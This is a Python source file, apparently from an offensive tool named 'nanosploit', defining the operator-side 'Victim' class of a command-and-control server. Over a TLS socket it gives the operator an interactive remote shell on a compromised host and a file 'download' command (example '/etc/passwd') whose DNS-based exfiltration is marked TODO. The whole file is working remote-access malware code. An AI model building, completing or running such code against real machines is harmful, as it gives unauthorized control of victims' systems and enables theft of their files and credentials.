import ssl

from nanosploit.dns import dns_handler


class Victim:
    _id: str
    conn: ssl.SSLSocket
    ip: str
    port: int
    commands: dict

    def __init__(self, client_id: str, conn: ssl.SSLSocket, addr: tuple):
        self._id = client_id
        self.conn = conn
        self.ip = addr[0]
        self.port = addr[1]
        self.commands = {
            "ping": self.__ping,
            "shell": self.__shell,
            "download": self.__download
        }

    def __ping(self) -> bool:
        self.conn.send(b"ping")
        buffer = self.conn.recv()
        if buffer:
            print(buffer.decode())
            return True
        else:
            return False

    def __shell(self) -> bool:
        # Tell client to enter shell mode
        self.conn.send(b"shell")

        exit_flag = True
        while exit_flag:
            # Get 'user:cwd' for prompt
            prompt = self.conn.recv().decode()

            while True:
                cmd = input(f"{prompt} $ ")
                if cmd == "exit":
                    self.conn.send(cmd.encode())
                    exit_flag = False
                    break
                elif cmd:
                    self.conn.send(cmd.encode())
                    buffer = self.conn.recv()
                    print(buffer.decode())
                    break
        return True

    def __download(self):
        src_path = input("Absolute source path on remote host (ex: '/etc/passwd') : ")
        if src_path:
            self.conn.send(b"exists "+src_path.encode())
            buffer = self.conn.recv()
            if buffer:
                if buffer == b"ok":
                    # TODO: start DNS transfer
                    pass
                else:
                    print("Error: file doesn't exist or is not a file")
            else:
                return False
        else:
            print("Error: enter a correct file name")
        return True

    def enter_shell(self) -> bool:
        while True:
            cmd: str = input(f"\033[4mnanoSploit\033[0m ({self._id}) > ")

            if cmd:
                cmd1 = cmd.split(" ")[0]
                match cmd1:
                    case cmd1 if cmd1 in ("exit", "quit", "q"):
                        # Exit client selection without closing connection
                        break
                    case "close":
                        # Exit client selection and closing connection
                        self.conn.close()
                        return False
                    case cmd1 if cmd1 in self.commands.keys():
                        if not self.commands[cmd1]():
                            # If None then lost connection
                            self.conn.close()
                            return False
                    case _:
                        print(f"Unknown command : '{cmd}'")
        return True

    def __str__(self):
        return f"{self.ip}:{self.port}"
